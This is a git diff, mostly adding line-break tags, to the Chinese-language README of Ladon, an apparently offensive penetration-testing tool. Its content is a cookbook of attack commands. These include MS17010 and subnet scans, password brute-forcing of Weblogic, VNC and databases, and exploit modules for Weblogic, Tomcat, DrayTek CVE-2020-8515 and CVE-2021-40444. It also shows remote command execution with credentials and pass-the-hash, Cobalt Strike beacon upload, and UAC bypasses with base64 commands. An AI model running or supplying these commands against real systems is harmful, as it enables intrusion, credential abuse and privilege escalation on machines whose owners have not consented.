@@ -47,86 +47,86 @@ Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传
 
 ### 特色
 
-扫描流量小
-程序体积小
-功能丰富强大
-程序简单易用
-插件支持多种语言
-跨平台(Win/Kali/Ubuntu)等
-支持Cobalt Strike插件化
-支持PowerShell无文件渗透
-Exp生成器可一键生成Poc
+扫描流量小<br>
+程序体积小<br>
+功能丰富强大<br>
+程序简单易用<br>
+插件支持多种语言<br>
+跨平台(Win/Kali/Ubuntu)等<br>
+支持Cobalt Strike插件化<br>
+支持PowerShell无文件渗透<br>
+Exp生成器可一键生成Poc<br>
 多版本适用各种环境
 
 ### 程序参数功能
 
-1  支持指定IP扫描
-2  支持指定域名扫描
-3  支持指定机器名扫描
-4  支持指定C段扫描(ip/24)
-5  支持指定B段扫描(ip/16)
-6  支持指定A段扫描(ip/8)
-7  支持指定URL扫描
-8  支持批量IP扫描(ip.txt)
-9  支持批量C段扫描(ip24.txt)
-10 支持批量B段扫描(ip16.txt)
-11 支持批量URL扫描(url.txt)
-12 支持批量域名扫描(domain.txt)
-13 支持批量机器名扫描(host.txt)
-14 支持批量国家段扫描(cidr.txt)
-15 支持批量字符串列表(str.txt)
-16 支持主机帐密列表(check.txt)
-17 支持用户密码列表(userpass.txt)
-18 支持指定范围C段扫描
-19 支持参数加载自定义DLL（仅限C#）
-20 支持参数加载自定义EXE（仅限C#）
-21 支持参数加载自定义INI配置文件
-22 支持参数加载自定义PowerShell
-23 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)
-24 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)
-25 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)
-26 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等
-27 INI配置支持自定义程序密码爆破
+1  支持指定IP扫描<br>
+2  支持指定域名扫描<br>
+3  支持指定机器名扫描<br>
+4  支持指定C段扫描(ip/24)<br>
+5  支持指定B段扫描(ip/16)<br>
+6  支持指定A段扫描(ip/8)<br>
+7  支持指定URL扫描<br>
+8  支持批量IP扫描(ip.txt)<br>
+9  支持批量C段扫描(ip24.txt)<br>
+10 支持批量B段扫描(ip16.txt)<br>
+11 支持批量URL扫描(url.txt)<br>
+12 支持批量域名扫描(domain.txt)<br>
+13 支持批量机器名扫描(host.txt)<br>
+14 支持批量国家段扫描(cidr.txt)<br>
+15 支持批量字符串列表(str.txt)<br>
+16 支持主机帐密列表(check.txt)<br>
+17 支持用户密码列表(userpass.txt)<br>
+18 支持指定范围C段扫描<br>
+19 支持参数加载自定义DLL（仅限C#）<br>
+20 支持参数加载自定义EXE（仅限C#）<br>
+21 支持参数加载自定义INI配置文件<br>
+22 支持参数加载自定义PowerShell<br>
+23 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)<br>
+24 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)<br>
+25 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)<br>
+26 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等<br>
+27 INI配置支持自定义程序密码爆破<br>
 
 ### 简明使用教程
 
-Ladon 简明使用教程 完整文档: http://k8gege.org/Ladon 
-支持Cmd、Cobalt Strike、PowerShell等内存加载
-Windows版本: .Net、Cobalt Strike、PowerShell
-全系统版本：GO(全平台)、Python(理论上全平台)
+Ladon 简明使用教程 完整文档: http://k8gege.org/Ladon <br>
+支持Cmd、Cobalt Strike、PowerShell等内存加载<br>
+Windows版本: .Net、Cobalt Strike、PowerShell<br>
+全系统版本：GO(全平台)、Python(理论上全平台)<br>
 PS: Study方便本地测试使用，完整功能请使用CMD
 
 ### 版本
-Ladon 10.10 20230318
-简明用法例子 202例
+Ladon 10.10 20230318<br>
+简明用法例子 202例<br>
 
 ### 001 自定义线程扫描
-例子：扫描目标10.1.2段是否存在MS17010漏洞
-单线程：Ladon 10.1.2.8/24 MS17010 t=1
-80线程：Ladon noping 10.1.2.8/24 MS17010 t=80
+例子：扫描目标10.1.2段是否存在MS17010漏洞<br>
+单线程：Ladon 10.1.2.8/24 MS17010 t=1<br>
+80线程：Ladon noping 10.1.2.8/24 MS17010 t=80<br>
 
-高强度防护下扫描线程设置低一些，单线程或F单线程最佳
+高强度防护下扫描线程设置低一些，单线程或F单线程最佳<br>
 单线程：Ladon 10.1.2.8/24 MS17010 f=1
 
 ### 002 Socks5代理扫描
-例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）
-Ladon noping 10.1.2.8/24 MS17010
+例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>
+Ladon noping 10.1.2.8/24 MS17010<br>
 详见：http://k8gege.org/Ladon/proxy.html
 
 ### 003 网段扫描/批量扫描
-CIDR格式：不只是/24/16/8(所有)
-Ladon 192.168.1.8/24 扫描模块
-Ladon 192.168.1.8/16 扫描模块
-Ladon 192.168.1.8/8  扫描模块
+CIDR格式：不只是/24/16/8(所有)<br>
+Ladon 192.168.1.8/24 扫描模块<br>
+Ladon 192.168.1.8/16 扫描模块<br>
+Ladon 192.168.1.8/8  扫描模块<br>
 
-字母格式：仅C段B段A段 顺序排序
-Ladon 192.168.1.8/c 扫描模块
-Ladon 192.168.1.8/b 扫描模块
-Ladon 192.168.1.8/a 扫描模块
+字母格式：仅C段B段A段 顺序排序<br>
+Ladon 192.168.1.8/c 扫描模块<br>
+Ladon 192.168.1.8/b 扫描模块<br>
+Ladon 192.168.1.8/a 扫描模块<br>
 
 ### 0x004指定IP范围、网段扫描
-Ladon 192.168.1.50-192.168.1.200 ICMP  ICMP探测1段50-200的存活主机
-Ladon 192.168.1.30-192.168.50.80 ICMP  ICMP探测1.30至50.80存活主机
+Ladon 192.168.1.50-192.168.1.200 ICMP  ICMP探测1段50-200的存活主机<br>
+Ladon 192.168.1.30-192.168.50.80 ICMP  ICMP探测1.30至50.80存活主机<br>
 
 TXT格式
 ##### 004 ICMP批量扫描C段列表存活主机
@@ -145,18 +145,18 @@ Ladon domain.txt ICMP
 Ladon host.txt ICMP
 
 ##### 009 WhatCMS批量识别CMS、Banner、SSL证书、标题，可识别未知CMS、路由器、打印机、网络设备、摄像头等
-Ladon 192.168.1.8 WhatCMS   扫描IP
-Ladon 192.168.1.8/24 WhatCMS   扫描C段
-Ladon 192.168.1.8/C WhatCMS   扫描C段
-Ladon 192.168.1.8/B WhatCMS   扫描B段
-Ladon 192.168.1.8/A WhatCMS   扫描A段
-Ladon IP.TXT WhatCMS   扫描IP列表
-Ladon IP24.TXT WhatCMS   扫描C段列表
-Ladon IP16.TXT WhatCMS   扫描B段列表
-Ladon cidr.TXT WhatCMS   扫描整个国家IP段列表
-禁PING扫描
-Ladon noping 192.168.1.8 WhatCMS   扫描IP
-Ladon noping 192.168.1.8/24 WhatCMS   扫描C段
+Ladon 192.168.1.8 WhatCMS   扫描IP<br>
+Ladon 192.168.1.8/24 WhatCMS   扫描C段<br>
+Ladon 192.168.1.8/C WhatCMS   扫描C段<br>
+Ladon 192.168.1.8/B WhatCMS   扫描B段<br>
+Ladon 192.168.1.8/A WhatCMS   扫描A段<br>
+Ladon IP.TXT WhatCMS   扫描IP列表<br>
+Ladon IP24.TXT WhatCMS   扫描C段列表<br>
+Ladon IP16.TXT WhatCMS   扫描B段列表<br>
+Ladon cidr.TXT WhatCMS   扫描整个国家IP段列表<br>
+禁PING扫描<br>
+Ladon noping 192.168.1.8 WhatCMS   扫描IP<br>
+Ladon noping 192.168.1.8/24 WhatCMS   扫描C段<br>
 
 ##### 010 批量检测DrayTek路由器版本、漏洞、弱口令
 Ladon url.txt DraytekPoc
@@ -195,7 +195,7 @@ Ladon 192.168.1.8/24 MS17010
 Ladon 192.168.1.8/24 SMBGhost	10.9移除
 
 ##### 021 扫描Web HTTP、HTTPS信息
-Ladon 192.168.1.8/24 WebScan
+Ladon 192.168.1.8/24 WebScan<br>
 Ladon http://192.168.1.8 WebScan
 
 ##### 022 扫描C段站点URL域名
@@ -208,15 +208,15 @@ Ladon 192.168.1.8/24 SameWeb
 Ladon baidu.com SubDomain
 
 ##### 025 域名解析IP、主机名解析IP
-Ladon baidu.com DomainIP
+Ladon baidu.com DomainIP<br>
 Ladon baidu.com HostIP
 
 ##### 025 批量域名解析IP、批量主机名解析IP
-Ladon domain.txt DomainIP
+Ladon domain.txt DomainIP<br>
 Ladon host.txt HostIP
 
 ##### 025 批量域名、主机名解析 结果只有IP
-Ladon domain.txt Domain2IP
+Ladon domain.txt Domain2IP<br>
 Ladon host.txt Host2IP
 
 ##### 026 DNS查询域内机器、IP (条件域内)
@@ -226,14 +226,14 @@ Ladon AdiDnsDump 192.168.1.8 (Domain IP)
 Ladon GetDomainIP
 
 ##### 028 扫描C段端口、指定端口扫描
-Ladon 192.168.1.8/24 PortScan
+Ladon 192.168.1.8/24 PortScan<br>
 Ladon 192.168.1.8 PortScan 80,445,3389
 
 ##### 029 扫描C段WEB及识别CMS（86+Web指纹识别）
 Ladon 192.168.1.8/24 WhatCMS
 
 ##### 030 扫描思科设备
-Ladon 192.168.1.8/24 CiscoInfo
+Ladon 192.168.1.8/24 CiscoInfo<br>
 Ladon http://192.168.1.8 CiscoInfo
 
 ##### 031 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）
@@ -284,7 +284,7 @@ Ladon 192.168.1.8/24 OracleScan
 Ladon 192.168.1.8/24 MysqlScan
 
 ##### 045 7001端口 Weblogic后台密码爆破
-Ladon http://192.168.1.8:7001/console WeblogicScan
+Ladon http://192.168.1.8:7001/console WeblogicScan<br>
 Ladon 192.168.1.8/24 WeblogicScan
 
 ##### 046 5900端口 VNC远程桌面密码爆破
@@ -339,7 +339,7 @@ Ladon 192.168.1.8/24 TomcatPoc
 Ladon 192.168.1.8/24 Struts2Poc
 
 ##### 062 DraytekPoc CVE-2020-8515漏洞检测、Draytek版本探测、弱口令检测
-Ladon 192.168.1.8 DraytekPoc
+Ladon 192.168.1.8 DraytekPoc<br>
 Ladon 192.168.1.8/24 DraytekPoc
 
 ### 漏洞利用/Exploit
@@ -350,13 +350,13 @@ Ladon 192.168.1.8/24 WeblogicExp
 Ladon 192.168.1.8/24 TomcatExp
 
 ##### 065 Windows 0day漏洞通用DLL注入执行CMD生成器(DLL仅5KB)
-Ladon CmdDll x86 calc
-Ladon CmdDll x64 calc
-Ladon CmdDll b64x86 YwBhAGwAYwA=
+Ladon CmdDll x86 calc<br>
+Ladon CmdDll x64 calc<br>
+Ladon CmdDll b64x86 YwBhAGwAYwA=<br>
 Ladon CmdDll b64x64 YwBhAGwAYwA=
 
 ##### 066 CVE-2021-40444  微软IE/Office 0day漏洞
-Ladon CVE-2021-40444 MakeCab poc.dll
+Ladon CVE-2021-40444 MakeCab poc.dll<br>
 Ladon CVE-2021-40444 MakeHtml http://192.168.1.8
 
 ##### 067 DraytekExp CVE-2020-8515远程执行命令EXP
@@ -375,7 +375,7 @@ Ladon ForExec "CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.
 ### 文件下载、文件传输
 
 ##### 071 HTTP下载 HTTPS下载 MSF下载
-Ladon wget https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe
+Ladon wget https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe<br>
 Ladon HttpDownLoad http://k8gege.org/Download/Ladon.rar
 
 ##### 072 Ftp下载 	
@@ -434,40 +434,40 @@ Ladon Recent
 Ladon UsbLog
 
 ##### 087 检测后门(注册表启动项、DLL劫持)
-Ladon CheckDoor
+Ladon CheckDoor<br>
 Ladon AutoRun
 
 ##### 088 进程详细信息(程序路径、位数、启动参数、用户) 	
-Ladon EnumProcess
+Ladon EnumProcess<br>
 Ladon Tasklist
 
 ##### 089 获取命令行参数 	
-Ladon cmdline
+Ladon cmdline<br>
 Ladon cmdline cmd.exe
 
 ##### 090 获取渗透基础信息 	
-Ladon GetInfo
+Ladon GetInfo<br>
 Ladon GetInfo2
 
 ##### 091 .NET & PowerShell版本 	
-Ladon NetVer
-Ladon PSver
-Ladon NetVersion
+Ladon NetVer<br>
+Ladon PSver<br>
+Ladon NetVersion<br>
 Ladon PSversion
 
 ##### 092 运行时版本&编译环境 	
-Ladon Ver
+Ladon Ver<br>
 Ladon Version
 
 ##### 093 运行时版本&编译环境&安装软件列表 	
-Ladon AllVer
+Ladon AllVer<br>
 Ladon AllVersion
 
 ##### 094 查看IE代理信息
 Ladon QueryProxy
 
 ##### 095  列目录
-Ladon DirList		默认列全盘
+Ladon DirList		默认列全盘<br>
 Ladon DirList c:\   指定盘符或目录
 
 ##### 096 QueryAdmin查看管理员用户	
@@ -483,25 +483,25 @@ Ladon RdpLog
 
 ##### 099 445端口 加密PSEXEC远程执行命令（交互式）
 
-net use \\192.168.1.8 k8gege520 /user:k8gege
-Ladon psexec 192.168.1.8
-psexec> whoami
+net use \\192.168.1.8 k8gege520 /user:k8gege<br>
+Ladon psexec 192.168.1.8<br>
+psexec> whoami<br>
 nt authority\system
 
 ##### 100 135端口 WmiExec远程执行命令 （非交互式）
-Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami  (8.2前用法)
-Ladon wmiexec 192.168.1.8 k8gege k8gege520 cmd whoami  (8.2后用法)
+Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami  (8.2前用法)<br>
+Ladon wmiexec 192.168.1.8 k8gege k8gege520 cmd whoami  (8.2后用法)<br>
 Ladon wmiexec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p  (8.2后用法)
 
 ##### 101 445端口 AtExec远程执行命令（非交互式）
 Ladon AtExec 192.168.1.8 k8gege k8gege520 whoami
 
 ##### 102 22端口 SshExec远程执行命令（非交互式）
-Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami
+Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami<br>
 Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami
 
 ##### 103 JspShell远程执行命令（非交互式）9.3.0移除
-Usage：Ladon JspShell type url pwd cmd
+Usage：Ladon JspShell type url pwd cmd<br>
 Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami
 
 ##### 104 WebShell远程执行命令（非交互式）9.3.0移除
@@ -516,7 +516,7 @@ Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon OSinfo
 ```
 
 ##### 105 135端口 WmiExec2远程执行命令支持HASH （非交互式）支持文件上传
-Usage:
+```Bash
 Ladon WmiExec2 host user pass cmd whoami
 Ladon WmiExec2 pth host cmd whoami		 先Mimikatz注入Hash，再pth执行命令
 Base64Cmd for Cobalt Strike
@@ -525,9 +525,10 @@ Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA
 Upload:
 Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe
 Ladon WmiExec2 pth host upload beacon.exe ceacon.exe  先Mimikatz注入Hash，再pth执行命令
+```
 
 ##### 106 445端口 SmbExec Ntlm-Hash非交互式远程执行命令(无回显)
-Ladon SmbExec 192.168.1.8 k8gege k8gege520 cmd whoami  
+Ladon SmbExec 192.168.1.8 k8gege k8gege520 cmd whoami<br>
 Ladon SmbExec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p
 
 ##### 107 WinrmExec远程执行命令无回显（支持System权限）
@@ -541,13 +542,14 @@ Ladon whoami
 
 ##### 109  6种白名单BypassUAC(8.0后)Win7-Win10  10.8版本移除
 用法: Ladon BypassUAC Method Base64Cmd
-
+```Bash
 Ladon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
 Ladon BypassUAC fodhelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
 Ladon BypassUAC computerdefaults Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
 Ladon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
 Ladon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
 Ladon BypassUAC dikcleanup Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==
+```
 
 ##### 110 BypassUac2 绕过UAC执行,支持Win7-Win10 	10.8版本移除
 Ladon BypassUac2 c:\1.exe
